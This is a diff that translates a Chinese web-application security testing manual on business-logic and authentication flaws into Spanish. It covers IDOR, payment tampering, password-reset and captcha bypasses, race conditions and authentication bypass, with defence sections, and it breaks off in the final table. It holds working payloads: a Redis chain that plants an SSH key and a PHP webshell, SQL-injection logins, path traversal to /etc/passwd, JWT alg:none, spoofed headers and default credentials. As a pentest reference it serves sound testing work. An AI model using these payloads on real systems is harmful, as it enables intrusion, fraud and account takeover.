@@ -1,169 +1,169 @@
-# Web逻辑与认证安全
+# Seguridad de Lógica de Negocio y Autenticación Web
 
-> **来源**: 基于WooYun漏洞库88,636个真实漏洞提炼，覆盖逻辑缺陷(8,292个)与未授权访问(14,377个)两大类
-> **用途**: Web应用安全测试中逻辑漏洞与认证绕过的实战参考手册
+> **Fuente**: Basado en 88,636 vulnerabilidades reales de la base de datos WooYun, abarca dos grandes categorías: defectos de lógica (8,292 casos) y acceso no autorizado (14,377 casos)
+> **Uso**: Manual de referencia práctico para pruebas de vulnerabilidades de lógica y bypass de autenticación en aplicaciones Web
 
 ---
 
-## 一、越权漏洞
+## Uno. Vulnerabilidades de escalada de privilegios (control de acceso roto)
 
-### 1.1 漏洞本质
+### 1.1 Esencia de la vulnerabilidad
 
-越权漏洞的根因是**授权校验缺失或不完整**——服务端未在每次资源操作时验证请求者是否具有对应权限。
+La causa raíz de las vulnerabilidades de control de acceso roto es la **falta o insuficiencia de la validación de autorización** — el servidor no verifica en cada operación sobre un recurso si el solicitante tiene el permiso correspondiente.
 
-| 类型 | 定义 | 根因 | 风险等级 |
+| Tipo | Definición | Causa raíz | Nivel de riesgo |
 |------|------|------|----------|
-| 水平越权 | 同级用户间越界访问 | 未校验资源归属 | 高 |
-| 垂直越权 | 低权限执行高权限操作 | 未校验角色权限 | 严重 |
+| Horizontal (IDOR) | Acceso indebido entre usuarios del mismo nivel | No se valida la pertenencia del recurso | Alto |
+| Vertical | Un usuario de bajo privilegio ejecuta operaciones de alto privilegio | No se valida el permiso del rol | Crítico |
 
-### 1.2 水平越权(IDOR)
+### 1.2 Escalada horizontal (IDOR)
 
-**高频场景与利用方式**:
+**Escenarios frecuentes y forma de explotación**:
 
 ```
-场景1: ID遍历——自增ID导致可预测
-GET /address/edit/?addid=100001  → 自己的地址
-GET /address/edit/?addid=100002  → 他人的地址(越权)
+Escenario 1: Enumeración de ID — ID autoincremental resulta predecible
+GET /address/edit/?addid=100001  → propia dirección
+GET /address/edit/?addid=100002  → dirección de otro usuario (escalada de privilegios)
 
-场景2: 资源替换攻击——修改操作缺少所有权验证
-账号A创建发票ID=1001 → 账号B修改时替换ID=1001 → A的发票被覆盖
+Escenario 2: Ataque de sustitución de recurso — la operación de modificación carece de validación de propiedad
+Cuenta A crea factura ID=1001 → cuenta B, al modificar, sustituye el ID=1001 → la factura de A queda sobrescrita
 
-场景3: API参数遍历——接口仅验证登录不验证权限
-/personal/center/family/{id}/edit → 替换id泄露他人信息
+Escenario 3: Enumeración de parámetros de API — la interfaz solo valida el login, no el permiso
+/personal/center/family/{id}/edit → sustituir id filtra información de otro usuario
 ```
 
-**测试方法**:
-1. 抓包记录正常请求中的ID参数(uid/orderId/addid等)
-2. 替换为其他用户的ID，观察响应
-3. 自动化遍历(Burp Intruder或脚本)
-4. 关注增删改查四类操作，修改和删除危害最大
+**Método de prueba**:
+1. Interceptar la petición y registrar el parámetro ID en una petición normal (uid/orderId/addid, etc.)
+2. Sustituirlo por el ID de otro usuario y observar la respuesta
+3. Automatizar la enumeración (Burp Intruder o script)
+4. Prestar atención a las cuatro operaciones CRUD; modificar y eliminar son las de mayor riesgo
 
 ```python
-# IDOR自动化检测思路
+# Idea de detección automatizada de IDOR
 def idor_test(base_url, param_name, id_range, session_cookie):
     for id in range(id_range[0], id_range[1]):
         resp = requests.get(
             f"{base_url}?{param_name}={id}",
             cookies={"session": session_cookie}
         )
-        if resp.status_code == 200 and "敏感数据特征" in resp.text:
+        if resp.status_code == 200 and "característica de dato sensible" in resp.text:
             print(f"[!] IDOR: {param_name}={id}")
 ```
 
-**越权测试矩阵**:
+**Matriz de pruebas de escalada de privilegios**:
 
-| 操作类型 | 测试方法 | 风险等级 |
+| Tipo de operación | Método de prueba | Nivel de riesgo |
 |----------|----------|----------|
-| 查看 | 替换资源ID | 中 |
-| 修改 | 替换资源ID+数据 | 高 |
-| 删除 | 替换资源ID | 严重 |
-| 创建 | 替换归属用户ID | 高 |
+| Consultar | Sustituir ID de recurso | Medio |
+| Modificar | Sustituir ID de recurso + datos | Alto |
+| Eliminar | Sustituir ID de recurso | Crítico |
+| Crear | Sustituir ID de usuario propietario | Alto |
 
-### 1.3 垂直越权
+### 1.3 Escalada vertical
 
-**核心利用方式**:
+**Forma de explotación central**:
 
 ```http
-# 普通用户修改资料时篡改角色标识
+# Un usuario normal manipula el identificador de rol al modificar su perfil
 POST /updateUser HTTP/1.1
-user.aid=3&user.name=test   # aid=3 普通用户
+user.aid=3&user.name=test   # aid=3 usuario normal
 
-# 篡改为管理员
+# Manipulación a administrador
 POST /updateUser HTTP/1.1
-user.aid=1&user.name=test   # aid=1 超级管理员
+user.aid=1&user.name=test   # aid=1 super administrador
 ```
 
-**检测要点**:
-- 枚举角色ID: 通常 1=超管, 2=管理员, 3+=普通用户
-- 测试角色切换: 修改请求中角色标识(role/aid/type/level)
-- 低权限账号直接访问管理员接口URL
-- 篡改权限标识: `isAdmin=0->1`, `role=user->admin`
+**Puntos clave de detección**:
+- Enumerar ID de rol: generalmente 1=super admin, 2=administrador, 3+=usuario normal
+- Probar el cambio de rol: modificar el identificador de rol en la petición (role/aid/type/level)
+- Acceder directamente a la URL de la interfaz de administrador con una cuenta de bajo privilegio
+- Manipular el identificador de permiso: `isAdmin=0->1`, `role=user->admin`
 
-### 1.4 防御措施
+### 1.4 Medidas de defensa
 
-- 资源访问前强制校验所有权: `WHERE id=? AND user_id=当前用户`
-- 使用UUID替代自增ID，防止枚举
-- 敏感操作记录审计日志
-- 实施最小权限原则，后端逐接口鉴权
-- 权限校验逻辑集中管理(中间件/拦截器)
+- Validar obligatoriamente la propiedad antes de acceder al recurso: `WHERE id=? AND user_id=usuario_actual`
+- Usar UUID en lugar de ID autoincremental para evitar la enumeración
+- Registrar log de auditoría para operaciones sensibles
+- Aplicar el principio de mínimo privilegio, con autorización verificada interfaz por interfaz en el backend
+- Gestión centralizada de la lógica de validación de permisos (middleware/interceptor)
 
 ---
 
-## 二、支付逻辑漏洞
+## Dos. Vulnerabilidades de lógica de pago
 
-### 2.1 漏洞本质
+### 2.1 Esencia de la vulnerabilidad
 
-支付漏洞的核心是**信任边界错误**——将价格计算等敏感逻辑下沉到客户端，服务端未独立校验。
+El núcleo de las vulnerabilidades de pago es un **error en el límite de confianza** — se traslada al cliente lógica sensible como el cálculo del precio, y el servidor no la valida de forma independiente.
 
 ```
-安全模型: 不可信区域(客户端) -> 信任边界 -> 可信区域(服务端)
-错误实现: 直接接受客户端提交的价格作为事实依据
-正确实现: 客户端仅提供商品ID，服务端独立查价计算
+Modelo de seguridad: zona no confiable (cliente) -> límite de confianza -> zona confiable (servidor)
+Implementación incorrecta: aceptar directamente el precio enviado por el cliente como hecho
+Implementación correcta: el cliente solo provee el ID del producto, el servidor consulta y calcula el precio de forma independiente
 ```
 
-### 2.2 常见场景与利用技巧
+### 2.2 Escenarios comunes y técnicas de explotación
 
-**场景1: 金额直接篡改**
+**Escenario 1: Manipulación directa del monto**
 
 ```http
-# 原始请求
+# Petición original
 POST /order/create HTTP/1.1
 {"productId":"12345","quantity":1,"price":299.00}
 
-# 篡改请求
+# Petición manipulada
 POST /order/create HTTP/1.1
 {"productId":"12345","quantity":1,"price":0.01}
 ```
 
-**场景2: 优惠券/折扣逻辑滥用**
+**Escenario 2: Abuso de la lógica de cupones/descuentos**
 
 ```
-1. 购买商品A(59元)，触发"满59换购B(5.9元)"
-2. 下单A+B，支付64.9元
-3. 取消商品A，仅保留B
-4. 实际以5.9元购得原价21元的商品B
+1. Comprar el producto A (59 yuanes), lo que activa la promoción "compra por 59 y canjea B (5.9 yuanes)"
+2. Se ordena A+B, se paga 64.9 yuanes
+3. Se cancela el producto A, dejando solo B
+4. En la práctica se obtiene el producto B (precio original 21 yuanes) por solo 5.9 yuanes
 
-测试思路: 组合订单后部分取消、优惠券使用后退货、积分兑换后退款
+Idea de prueba: cancelación parcial tras pedido combinado, devolución tras uso de cupón, reembolso tras canje de puntos
 ```
 
-**场景3: 虚拟货币刷取**
-- 注册推广可获积分 -> 暴力破解验证码批量注册 -> 积分兑换实物
+**Escenario 3: Obtención abusiva de moneda virtual**
+- Registro con referido otorga puntos -> fuerza bruta de captcha para registro masivo -> canje de puntos por productos físicos
 
-**场景4: 数量/负数攻击**
-- `count=1 -> count=-1` (负数导致退款)
-- `price=100 -> price=-100` (负金额)
+**Escenario 4: Ataque con cantidad/números negativos**
+- `count=1 -> count=-1` (número negativo provoca reembolso)
+- `price=100 -> price=-100` (monto negativo)
 
-### 2.3 系统化测试方法
+### 2.3 Metodología de prueba sistemática
 
 ```
-Phase 1: 参数指纹识别
-  - 抓包订单创建接口
-  - 识别价格参数(price/amount/total/cost/discount)
-  - 确定参数类型(整型/浮点/字符串)
+Fase 1: Identificación de huella de parámetros
+  - Interceptar la interfaz de creación de pedidos
+  - Identificar parámetros de precio (price/amount/total/cost/discount)
+  - Determinar el tipo de parámetro (entero/flotante/cadena)
 
-Phase 2: 边界值测试
-  - 最小值: 0, 0.01
-  - 负数: -1, -100, -0.01
-  - 格式: 科学计数法(1e-10), JSON嵌套
-  - 精度: 浮点溢出, 舍入误差
+Fase 2: Prueba de valores límite
+  - Valor mínimo: 0, 0.01
+  - Número negativo: -1, -100, -0.01
+  - Formato: notación científica (1e-10), JSON anidado
+  - Precisión: desbordamiento de flotante, error de redondeo
 
-Phase 3: 逻辑绕过
-  - 参数冗余: 提交多个price参数
-  - 参数覆盖: 先提价后降价
-  - 优惠券叠加: 价格+折扣双重操纵
-  - 组合订单后部分取消/退货
+Fase 3: Bypass de lógica
+  - Redundancia de parámetros: enviar múltiples parámetros price
+  - Sobrescritura de parámetros: subir el precio primero y luego bajarlo
+  - Acumulación de cupones: manipulación doble de precio + descuento
+  - Cancelación/devolución parcial tras pedido combinado
 
-Phase 4: 支付流程各环节校验
-  - 订单生成 -> 检查订单金额
-  - 支付跳转 -> 验证支付金额
-  - 支付回调 -> 伪造回调签名
-  - 退款流程 -> 检查退款金额
+Fase 4: Validación en cada etapa del flujo de pago
+  - Generación del pedido -> verificar el monto del pedido
+  - Redirección al pago -> validar el monto de pago
+  - Callback de pago -> falsificar la firma del callback
+  - Flujo de reembolso -> verificar el monto del reembolso
 ```
 
-**高级利用技巧**:
+**Técnicas de explotación avanzadas**:
 
 ```python
-# 价格篡改+并发竞争
+# Manipulación de precio + condición de carrera concurrente
 import threading
 def create_order():
     requests.post("/order/create", json={"price":0.01,"productId":"premium"})
@@ -172,224 +172,224 @@ for t in threads: t.start()
 ```
 
 ```http
-# 参数污染: 某些框架会处理重复参数
+# Contaminación de parámetros: algunos frameworks procesan parámetros duplicados
 POST /order/create?price=299.00&price=0.01
 
-# 类型转换绕过
-{"price":"0.01"}     字符串
-{"price":1e-10}      科学计数法
-{"price":null}       NULL注入
+# Bypass por conversión de tipo
+{"price":"0.01"}     cadena
+{"price":1e-10}      notación científica
+{"price":null}       inyección NULL
 ```
 
-### 2.4 防御措施
+### 2.4 Medidas de defensa
 
 ```
-Layer 1 输入验证: 仅接受商品ID不接受price; 金额正数最多2位小数
-Layer 2 业务逻辑: 服务端独立计算价格; 价格偏离阈值时拒绝/人工审核
-Layer 3 数据完整性: 订单签名(HMAC)防篡改; 时间戳防重放; 幂等性防重复
-Layer 4 支付验证: 回调金额=订单金额; 严格状态机; 全链路审计日志
+Capa 1 validación de entrada: aceptar solo el ID de producto, no el price; el monto debe ser positivo con máximo 2 decimales
+Capa 2 lógica de negocio: el servidor calcula el precio de forma independiente; rechazar/revisar manualmente si el monto se desvía de un umbral
+Capa 3 integridad de datos: firma del pedido (HMAC) contra manipulación; timestamp contra replay; idempotencia contra duplicación
+Capa 4 validación de pago: monto del callback = monto del pedido; máquina de estados estricta; log de auditoría de extremo a extremo
 ```
 
 ---
 
-## 三、密码重置漏洞
+## Tres. Vulnerabilidades de restablecimiento de contraseña
 
-### 3.1 漏洞本质
+### 3.1 Esencia de la vulnerabilidad
 
-密码重置漏洞的本质是**身份验证链条断裂**——重置流程中某个环节未正确绑定用户身份。
+La esencia de las vulnerabilidades de restablecimiento de contraseña es la **ruptura de la cadena de verificación de identidad** — en algún punto del flujo de restablecimiento no se vincula correctamente la identidad del usuario.
 
-### 3.2 四大漏洞模式
+### 3.2 Cuatro patrones principales de vulnerabilidad
 
-**模式A: 验证码回显泄露**
+**Patrón A: Fuga del código de verificación en la respuesta**
 
 ```http
 POST /sendSmsCode HTTP/1.1
 phone=13888888888
 
-# 响应中直接包含验证码
+# la respuesta contiene directamente el código de verificación
 {"code":0,"data":{"verifyCode":"123456"}}
 ```
 
-检测方法: 拦截发送验证码的响应包，搜索4-6位数字。
+Método de detección: interceptar el paquete de respuesta del envío del código de verificación, buscar un número de 4 a 6 dígitos.
 
-**模式B: 验证码与用户解绑**
-
-```
-1. 用自己手机号收到验证码A
-2. 对目标账号发起找回密码
-3. 使用验证码A完成验证(未绑定用户身份)
-根因: 验证码仅校验有效性，未校验归属用户
-```
-
-**模式C: 重置步骤可跳过**
+**Patrón B: Código de verificación desvinculado del usuario**
 
 ```
-正常: 输入账号 -> 身份验证 -> 重置密码 -> 完成
-攻击: 输入账号 -> [跳过] -> 直接访问重置密码页面
-
-实现方式:
-1. 分析前端JS，找到各步骤URL
-2. 直接访问第3步URL
-3. F12修改DOM: 隐藏验证步骤，显示重置步骤
+1. Se recibe el código de verificación A en el propio número de teléfono
+2. Se inicia la recuperación de contraseña en la cuenta objetivo
+3. Se usa el código de verificación A para completar la verificación (sin vinculación a la identidad del usuario)
+Causa raíz: el código de verificación solo se valida por su vigencia, no por su pertenencia al usuario
 ```
 
-**模式D: 凭证参数可控**
+**Patrón C: Pasos del restablecimiento se pueden omitir**
+
+```
+Normal: ingresar cuenta -> verificación de identidad -> restablecer contraseña -> completado
+Ataque: ingresar cuenta -> [omitir] -> acceder directamente a la página de restablecimiento de contraseña
+
+Forma de implementación:
+1. Analizar el JS del frontend para encontrar la URL de cada paso
+2. Acceder directamente a la URL del paso 3
+3. Modificar el DOM con F12: ocultar el paso de verificación, mostrar el paso de restablecimiento
+```
+
+**Patrón D: Parámetro de credencial controlable**
 
 ```http
 POST /resetPassword HTTP/1.1
 username=victim&newPassword=hacked123
-# 漏洞: username来自客户端，可被篡改为任意用户
+# Vulnerabilidad: username proviene del cliente, puede manipularse a cualquier usuario
 ```
 
-### 3.3 测试流程
+### 3.3 Flujo de prueba
 
 ```
-发起密码重置
-  +-- 抓包分析响应 -> 是否包含验证码 -> 模式A
-  +-- 分析验证流程
-  |     +-- 多步骤 -> 尝试跳过中间步骤 -> 模式C
-  |     +-- 单步骤 -> 检查参数绑定
-  |           +-- 用户ID可控 -> 参数篡改 -> 模式D
-  |           +-- 绑定Session -> Session固定测试
-  +-- 验证码机制
-        +-- 验证码是否与用户绑定 -> 模式B
-        +-- 验证码是否可爆破(无频率限制)
-        +-- 验证码是否有时效性
+Iniciar restablecimiento de contraseña
+  +-- Interceptar y analizar la respuesta -> ¿contiene el código de verificación? -> Patrón A
+  +-- Analizar el flujo de verificación
+  |     +-- Multietapa -> intentar omitir pasos intermedios -> Patrón C
+  |     +-- Etapa única -> verificar la vinculación de parámetros
+  |           +-- ID de usuario controlable -> manipulación de parámetro -> Patrón D
+  |           +-- Vinculado a Session -> prueba de fijación de sesión
+  +-- Mecanismo del código de verificación
+        +-- ¿está vinculado al usuario? -> Patrón B
+        +-- ¿es susceptible a fuerza bruta (sin límite de frecuencia)?
+        +-- ¿tiene vigencia temporal?
 ```
 
-### 3.4 防御措施
+### 3.4 Medidas de defensa
 
-- 验证码绑定用户Session，校验归属
-- 验证码单次有效+60秒过期
-- 重置Token一次性使用，不可预测
-- 全流程服务端状态校验，禁止跳步
-- 失败5次锁定，防爆破
+- Vincular el código de verificación a la Session del usuario, verificar la pertenencia
+- El código de verificación es de un solo uso y expira en 60 segundos
+- El Token de restablecimiento es de un solo uso e impredecible
+- Validación de estado en el servidor en todo el flujo, prohibir la omisión de pasos
+- Bloqueo tras 5 intentos fallidos, para prevenir fuerza bruta
 
 ---
 
-## 四、业务逻辑缺陷
+## Cuatro. Defectos de lógica de negocio
 
-### 4.1 漏洞本质
+### 4.1 Esencia de la vulnerabilidad
 
-业务逻辑缺陷的根因矩阵:
+Matriz de causas raíz de los defectos de lógica de negocio:
 
-| 层级 | 缺陷类型 | 典型表现 |
+| Nivel | Tipo de defecto | Manifestación típica |
 |------|----------|----------|
-| 业务层 | 流程设计缺陷 | 步骤可跳过、状态可伪造 |
-| 接口层 | 参数信任过度 | 客户端校验、服务端未验证 |
-| 认证层 | 凭证管理缺陷 | Token泄露、Session固定 |
-| 授权层 | 权限边界模糊 | 水平/垂直越权 |
+| Capa de negocio | Defecto de diseño del flujo | Pasos que se pueden omitir, estado que se puede falsificar |
+| Capa de interfaz | Confianza excesiva en parámetros | Validación en el cliente, sin validación en el servidor |
+| Capa de autenticación | Defecto de gestión de credenciales | Fuga de Token, fijación de Session |
+| Capa de autorización | Límite de permisos difuso | Escalada horizontal/vertical |
 
-### 4.2 验证码绕过
+### 4.2 Bypass de captcha
 
-**绕过方式1: 验证码不刷新**
-- 登录失败后验证码不自动刷新，同一验证码可重复使用
-- 利用: 手工识别一次，固定验证码暴力破解密码
+**Método de bypass 1: el captcha no se actualiza**
+- Tras un intento fallido de login, el captcha no se actualiza automáticamente, el mismo captcha se puede reutilizar
+- Explotación: reconocerlo manualmente una vez, luego usar el captcha fijo para fuerza bruta de la contraseña
 
-**绕过方式2: 验证码可爆破**
-- 4-6位纯数字，无次数/频率限制
-- 爆破空间10000-1000000，30线程约30秒完成
+**Método de bypass 2: el captcha es susceptible a fuerza bruta**
+- 4-6 dígitos numéricos puros, sin límite de intentos/frecuencia
+- Espacio de fuerza bruta 10000-1000000, con 30 hilos se completa en unos 30 segundos
 
-**绕过方式3: 前端校验**
-- 验证码仅在前端JS校验，删除前端校验代码或直接调用接口即可绕过
+**Método de bypass 3: validación solo en el frontend**
+- El captcha solo se valida en el JS del frontend; eliminando el código de validación del frontend o llamando directamente a la interfaz se puede evadir
 
-**验证码安全检测清单**:
-- 验证码是否在响应中泄露
-- 是否与Session/用户绑定
-- 是否有时效性(建议60秒)
-- 验证失败是否强制刷新
-- 是否有频率限制(建议5次/分钟)
-- 复杂度是否足够(建议6位字母数字混合)
+**Checklist de seguridad del captcha**:
+- ¿Se filtra el captcha en la respuesta?
+- ¿Está vinculado a la Session/usuario?
+- ¿Tiene vigencia temporal (se recomienda 60 segundos)?
+- ¿Se fuerza la actualización tras una verificación fallida?
+- ¿Tiene límite de frecuencia (se recomienda 5 intentos/minuto)?
+- ¿Tiene suficiente complejidad (se recomienda 6 caracteres alfanuméricos mixtos)?
 
-### 4.3 条件竞争(Race Condition)
+### 4.3 Condición de carrera (Race Condition)
 
-适用场景: 优惠券使用、积分兑换、库存扣减、余额支付
+Escenarios aplicables: uso de cupones, canje de puntos, deducción de inventario, pago con saldo
 
 ```python
 import threading, requests
 def redeem():
     requests.post("/redeem", data={"points":1000, "item":"iPhone"})
 
-# 并发100次，尝试多次兑换同一份积分
+# 100 solicitudes concurrentes, intentando canjear los mismos puntos varias veces
 threads = [threading.Thread(target=redeem) for _ in range(100)]
 for t in threads: t.start()
 ```
 
-根因: 检查余额与扣减余额不是原子操作，并发下可多次通过检查。
+Causa raíz: la verificación del saldo y la deducción del saldo no son una operación atómica, lo que bajo concurrencia permite pasar la verificación varias veces.
 
-### 4.4 参数篡改系统化方法
+### 4.4 Metodología sistemática de manipulación de parámetros
 
-| 参数类型 | 篡改方向 | 示例 |
-|----------|----------|------|
-| 用户ID | 替换为其他用户 | uid=1001->1002 |
-| 金额 | 减小/归零/负数 | price=100->0.01 |
-| 数量 | 负数 | count=1->-1 |
-| 状态 | 翻转布尔值 | isPaid=false->true |
-| 角色 | 提升权限 | role=user->admin |
-| 时间 | 延长有效期 | expireTime->2099-12-31 |
+| Tipo de parámetro | Dirección de manipulación | Ejemplo |
+|----------|----------|----------|
+| ID de usuario | Sustituir por otro usuario | uid=1001->1002 |
+| Monto | Reducir/anular/negativo | price=100->0.01 |
+| Cantidad | Número negativo | count=1->-1 |
+| Estado | Invertir el valor booleano | isPaid=false->true |
+| Rol | Escalar el privilegio | role=user->admin |
+| Tiempo | Extender la validez | expireTime->2099-12-31 |
 
-### 4.5 业务流程逆向分析法
+### 4.5 Método de análisis inverso del flujo de negocio
 
 ```
-步骤1: 绘制完整业务流程图
-步骤2: 识别每个环节的校验点
-步骤3: 评估校验是否可绕过(前端/后端? 可重放? 参数可控?)
-步骤4: 设计绕过测试用例
+Paso 1: dibujar el diagrama completo del flujo de negocio
+Paso 2: identificar los puntos de validación en cada etapa
+Paso 3: evaluar si la validación se puede evadir (¿frontend/backend? ¿replay posible? ¿parámetro controlable?)
+Paso 4: diseñar casos de prueba de bypass
 
-示例(密码重置流程):
-[输入账号] -> [发送验证码] -> [验证身份] -> [设置新密码]
+Ejemplo (flujo de restablecimiento de contraseña):
+[Ingresar cuenta] -> [Enviar código de verificación] -> [Verificar identidad] -> [Establecer nueva contraseña]
      |              |              |              |
-  账号枚举      验证码泄露      步骤跳过      参数篡改
+  enumeración de cuenta   fuga de código de verificación   omisión de paso   manipulación de parámetro
 ```
 
-### 4.6 防御原则
+### 4.6 Principios de defensa
 
-- **服务端权威**: 所有校验在服务端完成，前端校验仅为UX
-- **原子操作**: 关键业务(扣款/库存)使用事务+锁
-- **状态机**: 业务流程严格按状态机推进，不可跳步
-- **防重放**: 关键接口幂等设计，请求带时间戳+签名
+- **Autoridad del servidor**: toda validación debe completarse en el servidor, la validación del frontend es solo para UX
+- **Operación atómica**: los negocios críticos (deducción/inventario) deben usar transacciones + bloqueo
+- **Máquina de estados**: el flujo de negocio debe avanzar estrictamente según la máquina de estados, sin poder omitir pasos
+- **Prevención de replay**: diseño idempotente en interfaces críticas, petición con timestamp + firma
 
 ---
 
-## 五、认证绕过
+## Cinco. Bypass de autenticación
 
-### 5.1 漏洞本质
+### 5.1 Esencia de la vulnerabilidad
 
-认证绕过的核心是**信任链条被打破**: 系统错误地信任了来自不可信源的身份声明。
+El núcleo del bypass de autenticación es la **ruptura de la cadena de confianza**: el sistema confía erróneamente en una declaración de identidad proveniente de una fuente no confiable.
 
-### 5.2 Cookie/Session伪造
+### 5.2 Falsificación de Cookie/Session
 
 ```
-# 直接写入Cookie获得身份
+# escribir directamente en la Cookie para obtener identidad
 GET /registeruser/CookInsert?userAccount=admin&inner=1
--> 向Cookie写入admin身份，直接获得管理员Session
+-> escribe la identidad admin en la Cookie, obteniendo directamente la Session de administrador
 
-# Cookie中的身份标识可预测
+# el identificador de identidad en la Cookie es predecible
 Cookie: admin=true; userId=1
--> 修改Cookie值即可切换身份
+-> modificando el valor de la Cookie se puede cambiar de identidad
 ```
 
-JWT绕过:
+Bypass de JWT:
 
-| 技术 | Payload |
+| Técnica | Payload |
 |------|---------|
-| 空算法 | alg: none |
-| 弱密钥 | 暴力破解HS256密钥 |
-| 算法混淆 | RS256转HS256，用公钥签名 |
+| Algoritmo none | alg: none |
+| Clave débil | fuerza bruta de la clave HS256 |
+| Confusión de algoritmo | convertir RS256 a HS256, firmando con la clave pública |
 
-### 5.3 响应篡改绕过
+### 5.3 Bypass mediante manipulación de la respuesta
 
 ```
-正常: 请求验证 -> {"status":"0","msg":"验证码错误"} -> 停留验证页
-攻击: 请求验证 -> 拦截响应 -> 修改为{"status":"1","msg":"成功"} -> 进入下一步
+Normal: petición de verificación -> {"status":"0","msg":"código de verificación incorrecto"} -> permanece en la página de verificación
+Ataque: petición de verificación -> interceptar la respuesta -> modificarla a {"status":"1","msg":"éxito"} -> avanza al siguiente paso
 ```
 
-适用条件: 客户端根据响应状态控制流程+服务端后续步骤不重新验证。
+Condición aplicable: el cliente controla el flujo según el estado de la respuesta + el servidor no vuelve a validar en los pasos posteriores.
 
-### 5.4 IP伪造/Header绕过
+### 5.4 Falsificación de IP/bypass mediante encabezados
 
 ```http
-# 绕过IP白名单的常用Header
+# encabezados comunes para evadir la lista blanca de IP
 X-Forwarded-For: 127.0.0.1
 X-Real-IP: 127.0.0.1
 X-Originating-IP: 127.0.0.1
@@ -398,185 +398,185 @@ X-Client-IP: 127.0.0.1
 Host: localhost
 ```
 
-### 5.5 路径绕过
+### 5.5 Bypass de ruta
 
 ```
-# 大小写混淆
+# confusión de mayúsculas/minúsculas
 /ADMIN/  /Admin/  /aDmIn/
 
-# URL编码绕过
+# bypass por codificación URL
 %2e%2e%2f = ../
-%252e%252e%252f = ../ (双重编码)
+%252e%252e%252f = ../ (doble codificación)
 
-# 空字节截断
+# truncamiento con byte nulo
 ../../../etc/passwd%00.jpg
 
-# 添加后缀绕过
+# bypass agregando sufijo
 /admin -> /admin/  /admin;.js  /admin%23
 ```
 
-### 5.6 后台未授权访问
+### 5.6 Acceso no autorizado al backend
 
-高频未授权路径:
+Rutas de acceso no autorizado de alta frecuencia:
 
 ```
-# Web中间件
+# middleware Web
 /console/              (WebLogic)
 /manager/html          (Tomcat)
 /jmx-console/          (JBoss)
 /actuator/env          (Spring Boot)
-/actuator/heapdump     (Spring Boot, 可泄露密码)
+/actuator/heapdump     (Spring Boot, puede filtrar contraseñas)
 
-# API接口
-/swagger-ui.html       (API文档)
-/api-docs              (API文档)
-/api/configs           (配置泄露)
+# interfaces API
+/swagger-ui.html       (documentación de API)
+/api-docs              (documentación de API)
+/api/configs           (fuga de configuración)
 
-# 调试/管理
+# depuración/administración
 /admin/index.jsp
 /phpMyAdmin/
-/druid/index.html      (Druid监控)
+/druid/index.html      (monitoreo Druid)
 ```
 
-中间件弱口令速查:
+Referencia rápida de credenciales débiles de middleware:
 
-| 中间件 | 常见弱口令 |
+| Middleware | Credenciales débiles comunes |
 |--------|-----------|
 | Tomcat | admin:admin, tomcat:tomcat |
 | WebLogic | weblogic:weblogic, weblogic:12345678 |
-| JBoss | admin:admin(或无认证) |
+| JBoss | admin:admin (o sin autenticación) |
 
-### 5.7 数据库/服务未授权
+### 5.7 Acceso no autorizado a bases de datos/servicios
 
-| 服务 | 端口 | 验证命令 | 利用方式 |
+| Servicio | Puerto | Comando de verificación | Forma de explotación |
 |------|------|----------|----------|
-| Redis | 6379 | redis-cli -h IP info | 写SSH公钥/Webshell/计划任务 |
-| MongoDB | 27017 | mongo IP:27017 | 无认证直连，导出全部数据 |
-| Elasticsearch | 9200 | curl IP:9200/_cat/indices | 读取索引数据 |
-| Memcached | 11211 | echo stats, nc IP 11211 | 数据泄露 |
-| Docker API | 2375 | curl IP:2375/info | 容器逃逸/RCE |
+| Redis | 6379 | redis-cli -h IP info | escribir clave pública SSH/Webshell/tarea programada |
+| MongoDB | 27017 | mongo IP:27017 | conexión directa sin autenticación, exportar todos los datos |
+| Elasticsearch | 9200 | curl IP:9200/_cat/indices | leer datos del índice |
+| Memcached | 11211 | echo stats, nc IP 11211 | fuga de datos |
+| Docker API | 2375 | curl IP:2375/info | escape de contenedor/RCE |
 
-Redis未授权利用链(高危):
+Cadena de explotación de Redis no autorizado (alto riesgo):
 
 ```bash
 redis-cli -h target
-# 写SSH公钥
+# escribir clave pública SSH
 config set dir /root/.ssh/
 config set dbfilename authorized_keys
 set x "\n\nssh-rsa AAAA...\n\n"
 save
 
-# 写Webshell
+# escribir Webshell
 config set dir /var/www/html/
 config set dbfilename shell.php
 set x "<?php system($_GET['c']);?>"
 save
 ```
 
-### 5.8 Session绕过
+### 5.8 Bypass de Session
 
 ```
-# Session ID泄露(日志/URL)
-/logs/ctp.log -> 包含Session ID -> 直接使用
+# fuga del Session ID (logs/URL)
+/logs/ctp.log -> contiene el Session ID -> se usa directamente
 
-# Session固定攻击
-强制用户使用攻击者指定的Session ID
+# ataque de fijación de sesión
+forzar al usuario a usar un Session ID especificado por el atacante
 
-# Session预测
-时间戳/顺序号生成的弱Session -> 可预测下一个Session
+# predicción de Session
+Session débil generado por timestamp/número secuencial -> el siguiente Session es predecible
 ```
 
-### 5.9 万能密码(SQL注入登录)
+### 5.9 Contraseña universal (login por inyección SQL)
 
 ```
-用户名: ' or 1=1--
-密码:   任意
+Usuario: ' or 1=1--
+Contraseña:   cualquiera
 
-用户名: admin'--
-密码:   任意
+Usuario: admin'--
+Contraseña:   cualquiera
 ```
 
-### 5.10 认证绕过测试清单
+### 5.10 Checklist de pruebas de bypass de autenticación
 
-| 测试项 | 方法 | 工具 |
+| Elemento de prueba | Método | Herramienta |
 |--------|------|------|
-| Cookie伪造 | 修改用户标识字段 | BurpSuite |
-| Session固定 | 复用他人Session | 抓包工具 |
-| 响应篡改 | 修改返回状态码 | BurpSuite |
-| IP伪造 | 添加X-Forwarded-For | curl/Burp |
-| 前端绕过 | 修改JS逻辑 | DevTools |
-| JWT篡改 | 空算法/弱密钥 | jwt.io/hashcat |
-| 路径绕过 | 大小写/编码/截断 | 手动+字典 |
-| 弱口令 | 默认凭证尝试 | Hydra |
-| SQL注入登录 | 万能密码 | 手动 |
+| Falsificación de Cookie | modificar el campo identificador de usuario | BurpSuite |
+| Fijación de Session | reutilizar la Session de otro usuario | herramienta de interceptación |
+| Manipulación de respuesta | modificar el código de estado devuelto | BurpSuite |
+| Falsificación de IP | agregar X-Forwarded-For | curl/Burp |
+| Bypass en frontend | modificar la lógica JS | DevTools |
+| Manipulación de JWT | algoritmo none/clave débil | jwt.io/hashcat |
+| Bypass de ruta | mayúsculas/minúsculas/codificación/truncamiento | manual+diccionario |
+| Credencial débil | probar credenciales predeterminadas | Hydra |
+| Login por inyección SQL | contraseña universal | manual |
 
-### 5.11 防御措施
+### 5.11 Medidas de defensa
 
-| 层面 | 措施 |
+| Ámbito | Medida |
 |------|------|
